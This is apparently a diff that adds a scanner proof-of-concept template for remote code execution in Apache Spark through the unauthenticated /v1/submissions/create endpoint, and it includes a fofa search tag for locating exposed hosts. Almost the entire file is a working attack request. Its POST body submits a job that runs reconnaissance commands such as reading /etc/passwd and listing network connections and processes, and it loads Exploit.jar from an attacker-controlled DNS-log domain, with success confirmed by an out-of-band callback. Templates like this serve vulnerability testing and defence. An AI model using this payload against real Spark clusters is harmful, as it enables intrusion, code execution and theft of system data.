@@ -1,0 +1,28 @@
+id: poc-yaml-spark-submissions-create-rce
+info:
+  name: Apache Spark submissions/create 命令注入漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - 命令注入
+  finger: ''
+  fofa: spark
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /v1/submissions/create
+  headers:
+    Content-Type: application/json
+  data: "{\n  \"action\": \"CreateSubmissionRequest\",\n  \"clientSparkVersion\":\
+    \ \"2.3.1\",\n  \"appArgs\": [\n    \"cat /etc/passwd,w,cat /proc/version,ifconfig,route,df\
+    \ -h,free -m,netstat -nltp,ps auxf\"\n  ],\n  \"appResource\": \"https://{{.reverseDomain}}/Exploit.jar\"\
+    ,\n  \"environmentVariables\": {\n    \"SPARK_ENV_LOADED\": \"1\"\n  },\n  \"\
+    mainClass\": \"Exploit\",\n  \"sparkProperties\": {\n    \"spark.jars\": \"https://{{.reverseDomain}}/Exploit.jar\"\
+    ,\n    \"spark.driver.supervise\": \"false\",\n    \"spark.app.name\": \"Exploit\"\
+    ,\n    \"spark.eventLog.enabled\": \"true\",\n    \"spark.submit.deployMode\"\
+    : \"cluster\",\n    \"spark.master\": \"spark://your-ip:6066\"\n  }\n}"
+  expression: "status_code == 200 && \ncontains(body,\"submissionId\") &&\ncontains(body,\"\
+    CreateSubmissionResponse\") &&\nreverse.Verify()\n"
+transport: http
